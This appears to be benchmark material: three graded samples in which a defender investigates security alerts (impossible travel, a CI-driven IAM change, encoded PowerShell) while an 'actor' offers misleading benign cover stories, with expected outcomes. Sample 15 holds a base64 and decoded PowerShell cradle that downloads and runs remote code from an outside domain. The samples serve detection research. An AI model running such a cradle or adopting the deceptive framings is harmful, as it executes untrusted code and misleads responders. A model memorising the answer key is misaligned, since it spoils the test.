# Batch 05 — judge-alignment samples

Three samples broadening the tooling surface (Okta + CrowdStrike + Azure AD;
AWS CloudTrail + CodeBuild + Splunk; Microsoft Defender for Endpoint +
Sysmon + email-security). Refutations and gaps continue to live in
cross-tool joins.

---

## Sample 13 — caught (impossible-travel, device-bound concurrent session)

**Expected outcome:** `caught`

**Rationale:** Actor frames an impossible-travel sign-in as a VPN/proxy
artifact — the user genuinely signed in, but their traffic exited a
different geography due to a corporate proxy reroute. Identity-only leads
(Okta history, ASN reputation) cannot refute. The load-bearing refutation
joins Azure AD's session-bound device claim with the CrowdStrike host
telemetry of the user's primary device: the corporate laptop has a live,
active, screen-unlocked session with keystrokes interleaved with the new
sign-in's timestamp. The "VPN reroute" story has no place for a separate
authenticating device.

**Expected actor observation (gist):** Actor's VPN-reroute framing could not absorb the simultaneously active compliant-device Azure AD sign-in from `LAPTOP-RKAPOOR` with live CrowdStrike keystrokes, paired with the Lagos sign-in carrying `deviceId=null`.

### alert.json (trimmed)

```json
{
  "source": "okta.system_log",
  "eventType": "user.session.start",
  "outcome": "SUCCESS",
  "actor": {"alternateId": "rkapoor@example.com"},
  "client": {
    "ipAddress": "41.218.84.6",
    "geo": {"country": "Nigeria", "city": "Lagos"},
    "userAgent": {"os": "Windows 11", "browser": "Chrome 124"}
  },
  "authenticationContext": {"authenticationStep": 0},
  "rule": {"id": "okta.impossible_travel", "severity": "high"}
}
```

### investigation.md (excerpt)

```
## PHASE: GATHER

Lead 0: okta.system_log (90d sign-in history for rkapoor)
  → 1,084 sign-ins. 1,071 from 198.18.4.0/24 (SF office NAT) + home cable
    range in San Jose. 12 from corporate VPN egress (Amsterdam, Frankfurt
    — matches travel records). 1 from 41.218.84.6 (this alert). No prior
    Nigeria activity.

Lead 1: enrich.asn-reputation (41.218.84.6)
  → MTN Nigeria mobile. No threat-intel listings. Used by many residential
    customers; not exclusive to threat actors.

Lead 2: azure.sign_in_logs (rkapoor, ±15min)
  → 2 active interactive sign-ins at the alert moment:
    - sign-in A: deviceId=AAD-abc123, deviceName="LAPTOP-RKAPOOR",
      compliantDevice=true, joinType=hybrid, srcip=198.18.4.61, status=active,
      session started 09:02:14 PT, last token refresh 11:47:50 PT.
    - sign-in B: deviceId=null, srcip=41.218.84.6, browser=Chrome/Windows,
      this alert's session.
  Conditional Access: sign-in B was prompted for MFA and satisfied via
    rkapoor's registered Authenticator push at 11:48:02 PT.

Lead 3: crowdstrike.host_events (LAPTOP-RKAPOOR, ±15min around 11:48 PT)
  → host online, lock state = unlocked, foreground process Excel.exe, 47
    keystroke-generating events in the 15 minutes around the alert. No
    user-initiated lock. No process activity consistent with an Authenticator
    approval workflow on this host (which would not be expected — the
    Authenticator runs on a phone).

Lead 4: intune.device_inventory (rkapoor's registered devices)
  → 2 devices: LAPTOP-RKAPOOR (corporate, compliant) + iPhone-rkapoor
    (corporate-managed, Authenticator installed). No Windows device in
    Nigeria; no third device registered to the user.

## PHASE: ANALYZE
?vpn-reroute -- (would not produce a *second* active sign-in with no device
  id; corporate VPN egress sign-ins in history all carry the device claim)
?legitimate-second-device -- (Intune shows no third device; rkapoor's only
  Windows device is currently in active use in SF)
?session-token-theft-with-mfa-pushed-to-victim ++ (canonical adversary-in-the-
  middle: attacker drove the sign-in, victim approved a push notification
  unknowingly because she was actively working and Authenticator pushes look
  routine)
```

### actor_story.md

```
## Attack story
rkapoor is travelling and signed in through a corporate VPN that egresses
via a partner POP. The proxy reroute makes her sign-in look like it came
from Lagos. She approved the MFA prompt herself.

## Goal
Frame the alert as a benign VPN/geo artifact for an authenticated user.

## Bypass
The defender can verify the MFA was approved and the user has Okta history;
they cannot reach inside an opaque proxy to see her real source location.
Impossible-travel rules over-trigger on legitimate proxy reroutes.
```

### projected_telemetry.yaml

```yaml
- lead_position: 0
  events:
    - {srcip_history: "office + home + occasional EU corporate VPN", anomaly: "Nigeria first-seen"}
- lead_position: 1
  events:
    - {asn: "mobile carrier, ambiguous reputation"}
- lead_position: 2
  events:
    # Story implies a single active sign-in (the VPN-rerouted one); does
    # not project a concurrent compliant-device session
    - {sign-in: {srcip: 41.218.84.6, mfa: approved, deviceId: null}}
- lead_position: 3
  events:
    - {host: LAPTOP-RKAPOOR, active_user_input: false, note: "no separate active SF laptop session projected"}
- lead_position: 4
  events:
    - {device: LAPTOP-RKAPOOR, compliant: true}
    - {device: iPhone-rkapoor, compliant: true}
```

**Expected findings:**

- **`detection-confirmed`** on lead 2 (Azure AD sign-in log). The
  load-bearing identity-side refutation is two active interactive sign-ins at
  the alert moment: the established compliant-device session from
  `LAPTOP-RKAPOOR` and the Lagos session carrying `deviceId=null`. The
  VPN-reroute story projects one sign-in; the surface carries two from
  incompatible postures.
- **`detection-confirmed`** on lead 3 (CrowdStrike host events). The endpoint
  lead proves the compliant-device session was not stale: `LAPTOP-RKAPOOR` was
  online, screen-unlocked, and receiving keystrokes around the alert. That
  turns the Azure AD concurrency into a user-presence contradiction rather than
  just an old token refresh.
---

## Sample 14 — survived (CloudTrail IAM change, IaC-provenance gap)

**Expected outcome:** `survived`

**Rationale:** Defender exhausts every CloudTrail-adjacent lead. The IAM
policy attachment is performed by a CI service principal, the CodeBuild build
log shows a `terraform apply` run that includes the change, and downstream
role usage is unremarkable. The actor's story — an attacker landed the change
through the CI/IaC path while preserving the normal apply shape — is consistent
with every observation. The load-bearing claim — *which Git commit, by which
author, drove the apply* — sits in a Git/CI provenance chain the investigation
does not cross-reference.

**Expected actor observation (gist):** Story's load-bearing claim about who authored the Terraform driving the IAM change sat in a Git commit-author / PR-approval / signed-source-provenance chain that no CloudTrail / CodeBuild / Splunk / Config lead crossed.

### alert.json (trimmed)

```json
{
  "source": "aws.cloudtrail",
  "eventName": "AttachRolePolicy",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROAEXAMPLE:codebuild-tf-apply",
    "arn": "arn:aws:sts::123456789012:assumed-role/CIPipelineRole/codebuild-tf-apply",
    "sessionContext": {"sessionIssuer": {"userName": "CIPipelineRole"}}
  },
  "requestParameters": {
    "roleName": "DataPlatformExecRole",
    "policyArn": "arn:aws:iam::123456789012:policy/S3ReadWriteDataLake"
  },
  "rule": {"id": "iam.privileged_role_change", "severity": "medium"}
}
```

### investigation.md (excerpt)

```
## PHASE: GATHER

Lead 0: cloudtrail.event_history (CIPipelineRole, ±2h)
  → 412 events from the same assumed-role session. STS:AssumeRole at
    14:02:11Z from CodeBuild execution environment IP (within published AWS
    ranges for codebuild.us-east-1). 38 IAM events in window: 12 policy
    attachments, 4 role updates, 22 GetPolicy/ListPolicies. Cluster shape
    matches a `terraform apply` run.

Lead 1: codebuild.build_logs (build id matching the session window)
  → build `tf-apply-prod#4127`, triggered by `webhook:push:main`, succeeded
    at 14:11:47Z. Log shows `terraform plan` (52 resource changes including
    the policy attachment in question) followed by `terraform apply`. Plan
    output checksum signed and stored in S3.

Lead 2: splunk.privileged_action_usage (DataPlatformExecRole, 7d after)
  → 18,440 actions, all matching the role's documented purpose (S3 reads,
    Glue catalog updates, no GetSecretValue, no AssumeRole to other accounts,
    no IAM changes). Usage shape consistent with the pre-change baseline
    plus the newly granted S3:GetObject calls.

Lead 3: cloudtrail.event_history (CIPipelineRole, 90d baseline)
  → 38,210 IAM events in 90d. Daily applies on weekdays. This change sits
    in the upper-quartile by event count but within distribution; the
    24-hour neighbourhood contains a comparable apply.

Lead 4: aws.config.compliance (post-change)
  → all guardrails pass: no public S3 buckets, no IAM admin grants, no
    boundary-policy violations. Change is within the platform's authorized
    blast-radius envelope.

## PHASE: ANALYZE
?legitimate-iac-apply ++ (CI principal, build log, signed plan, baseline-
  consistent activity, guardrails pass)
?ci-pipeline-compromise + (cannot rule out — a build run with attacker-
  authored or attacker-injected Terraform would produce a result
  indistinguishable on this surface from a legitimate authored change)
Picture: insufficient. Discriminating evidence (Git commit author,
PR-approval chain, signed provenance from source repo through to build) is
out of scope for the available tool surface.
Disposition: inconclusive, escalate for Git/CI provenance review.
```

### actor_story.md

```
## Attack story
An attacker gained the ability to land Terraform into the production apply
path — either by compromising the CI runner or by pushing an approved-looking
change through the normal repository workflow. The applied Terraform grants
the data platform role read/write on the S3 data-lake bucket while preserving
the normal `tf-apply-prod` CloudTrail and CodeBuild shape.

## Goal
Frame the IAM change as an approved IaC delivery.

## Bypass
Every CloudTrail/CodeBuild/Splunk lead will see the same apply shape whether
the change came from a legitimate reviewed PR or from attacker-controlled
Terraform that reached the pipeline. The available investigation surface does
not chain the cloud event back to Git authorship, PR approval, and signed
source provenance.
```

### projected_telemetry.yaml

```yaml
- lead_position: 0
  events:
    - {principal: codebuild-tf-apply, cluster: "terraform apply shape"}
- lead_position: 1
  events:
    - {build: success, plan_signed: true, includes_policy_attach: true}
- lead_position: 2
  events:
    - {role_usage: baseline_plus_documented_grant}
- lead_position: 3
  events:
    - {applies_per_day: routine, this_change: in_distribution}
- lead_position: 4
  events:
    - {guardrails: pass}
```

**Expected findings:**

- **`lead-set`** gap: no lead joined the CodeBuild run back to the Git commit,
  PR approval chain, and source provenance that caused the Terraform apply.
  Every CloudTrail / CodeBuild / Splunk / Config lead proves that an apply
  happened and stayed within guardrails; none proves who authored the source
  change that drove it.
- **`observability`** gap: the available CloudTrail / CodeBuild / Splunk /
  Config surface does not chain Git commit authorship, PR approval, or signed
  source provenance to the CloudTrail event. CodeBuild logs name the *build*,
  not the trustworthy *source author*; Splunk + Config see the post-apply
  state, not the source-of-truth. This is the structural blocker for the
  actor's provenance claim, and closing it requires GitHub/GitLab plus signed
  provenance ingestion, not more CloudTrail pivots.

---

## Sample 15 — caught (encoded PowerShell + email carrier join)

**Expected outcome:** `caught`

**Rationale:** Actor frames an encoded-PowerShell alert as
Microsoft-published management tooling (which legitimately uses
EncodedCommand). Sysmon and Defender for Endpoint reveal the parent process
is Outlook (not a scheduler/MSI runner), the decoded command performs an
outbound web request to a recently-registered domain, and email-security
shows a .docm attachment opened two minutes earlier. The carrier-chain
refutation is decisive: management tooling does not spawn from Outlook two
minutes after a macro-enabled document opens.

**Expected actor observation (gist):** Actor's "Microsoft management tooling using EncodedCommand" framing fell to the `outlook → winword → cmd → powershell` lineage tied to a `.docm` opened 2 minutes earlier; the first-contact HTTPS destination corroborates but is not the core observation.

### alert.json (trimmed)

```json
{
  "source": "microsoft.defender_for_endpoint",
  "deviceName": "FIN-WS-014",
  "alertTitle": "Suspicious PowerShell command line",
  "evidence": {
    "processName": "powershell.exe",
    "processCommandLine": "powershell.exe -NoP -W Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2ZpbmFuY2lhbC11cGRhdGUuY28udWsvc3RhZ2UuZWNobycp",
    "user": {"name": "p.dixon", "sid": "S-1-5-..."}
  },
  "rule": {"id": "edr.suspicious_powershell", "severity": "high"}
}
```

### investigation.md (excerpt)

```
## PHASE: GATHER

Lead 0: defender.device_process_events (FIN-WS-014, ±5min around alert)
  → process tree: outlook.exe → winword.exe → cmd.exe → powershell.exe
    (the alerting process). powershell decoded: `IEX (New-Object
    Net.WebClient).DownloadString('https://financial-update.co.uk/stage.echo')`
    Subsequent powershell child: rundll32.exe with no module argument
    (template-injection load).

Lead 1: splunk.sysmon (FIN-WS-014, same window)
  → corroborates the process chain. winword.exe loaded a remote template
    fetched over HTTP (Sysmon Event 7 with image=`https://...stage.echo`).
    No legitimate management tool fits this lineage.

Lead 2: email_security.deliveries (p.dixon, last 30 min)
  → 1 inbound message at T-3min from `accounts-payable@finance-partner.net`
    with attachment `Invoice-2026-Q1-final.docm`. Sender domain registered
    14 days ago; SPF=softfail, DKIM=none. The attachment hash matches the
    file Word opened in lead 1.

Lead 3: defender.network_events (FIN-WS-014, ±5min)
  → DNS resolution + HTTPS connection to financial-update.co.uk, then a
    follow-on TCP/443 stream of ~2.4MB. Destination domain registered 9 days
    ago. No prior contact from any host in tenant.

Lead 4: intune.app_inventory (FIN-WS-014)
  → no installed management agent that uses EncodedCommand at runtime
    (e.g., no Configuration Manager, no Tanium, no Automox). Only standard
    Microsoft 365 + corporate browser + the org's MDM.

## PHASE: ANALYZE
?management-tooling -- (Outlook → Word → cmd → powershell is not a
  management-tool ancestry; no relevant agent installed on this host)
?phishing-with-macro-template-injection ++ (canonical: recent macro-enabled
  attachment → Word remote template load → process chain → encoded
  downloader → outbound to recently-registered domain)
```

### actor_story.md

```
## Attack story
Microsoft and corporate management tools routinely use
PowerShell -EncodedCommand to pass complex scripts. The alert is on a
configuration-management run that downloads a script bundle from a
financial-systems vendor for accounting reconciliation.

## Goal
Frame the encoded PowerShell as routine enterprise management traffic.

## Bypass
Decoding the EncodedCommand will reveal a Net.WebClient call, which itself
is widely used by management tooling. The defender will not necessarily
trace the parent process and even if they do, an internal Outlook+Word
workflow is not uncommon for finance staff.
```

### projected_telemetry.yaml

```yaml
- lead_position: 0
  events:
    - {parent_chain: "svchost → MsiExec OR ScheduledTask → powershell",
       reason: "management tooling typical lineage"}
- lead_position: 1
  events:
    - {sysmon: "consistent with scheduled or service-launched powershell"}
- lead_position: 2
  events: []   # story does not place a phishing email on this user
- lead_position: 3
  events:
    - {dst: "vendor financial-systems CDN, established history"}
- lead_position: 4
  events:
    - {agent: "configuration-management installed"}
```

**Expected findings:**

- **`detection-confirmed`** on lead 0 (DeviceProcessEvents). The
  Outlook → Word → cmd → powershell lineage refutes the management-tooling
  projection, which expected svchost / MSI / scheduler ancestry. The decoded
  downloader and follow-on rundll32 child make the alerting process an
  interactive Office-carried execution chain, not enterprise management
  automation.
- **`detection-confirmed`** on lead 2 (email_security). The inbound
  macro-enabled invoice attachment, matching the file Word opened, supplies
  the carrier the actor story projected absent. The lure-shaped filename,
  SPF/DKIM failures, and recently registered sender domain corroborate the
  phishing-with-template-injection path while remaining anchorable to the
  email lead.
